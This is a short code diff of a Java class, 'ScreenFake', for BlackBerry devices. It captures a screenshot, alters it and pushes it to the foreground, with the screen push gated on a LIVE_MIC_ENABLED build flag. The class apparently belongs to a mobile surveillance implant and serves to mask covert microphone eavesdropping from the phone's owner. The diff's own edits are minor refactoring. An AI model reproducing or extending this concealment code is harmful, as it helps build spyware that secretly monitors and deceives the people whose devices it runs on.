@@ -1,5 +1,6 @@
 package blackberry;
 
+import net.rim.device.api.system.Application;
 import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.ui.component.BitmapField;
@@ -20,14 +21,14 @@ public class ScreenFake extends MainScreen {
 
         bitmap = SnapShotAgent.getScreenshot();
         modifyBitmap();
-        BitmapField field = new BitmapField(bitmap);
+        final BitmapField field = new BitmapField(bitmap);
         add(field);
     }
 
     private void modifyBitmap() {
-        int height = bitmap.getHeight();
-        int width = bitmap.getWidth();
-        int[] rgbdata = new int[width * height];
+        final int height = bitmap.getHeight();
+        final int width = bitmap.getWidth();
+        final int[] rgbdata = new int[width * height];
         //Graphics g = new Graphics(bmp);
         bitmap.getARGB(rgbdata, 0, width, 0, 0, width, height);
 
@@ -43,14 +44,14 @@ public class ScreenFake extends MainScreen {
 
     public static void Push() {
         if (!Conf.IS_UI) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("Not UI");
             //#endif
             return;
         }
 
         instance = new ScreenFake();
-        synchronized (UiApplication.getEventLock()) {
+        synchronized (Application.getEventLock()) {
             //#ifdef LIVE_MIC_ENABLED
             UiApplication.getUiApplication().requestForeground();
             UiApplication.getUiApplication().pushScreen(instance);
@@ -63,7 +64,7 @@ public class ScreenFake extends MainScreen {
 
     public static void Pop() {
         if (!Conf.IS_UI) {
-            //#ifdef DEBUG_WARN
+            //#ifdef DEBUG
             debug.warn("Not UI");
             //#endif
             return;
@@ -71,7 +72,7 @@ public class ScreenFake extends MainScreen {
 
         if (instance != null) {
             //#ifdef LIVE_MIC_ENABLED 
-            synchronized (UiApplication.getEventLock()) {
+            synchronized (Application.getEventLock()) {
                 UiApplication.getUiApplication().popScreen(instance);
             }
             //#endif
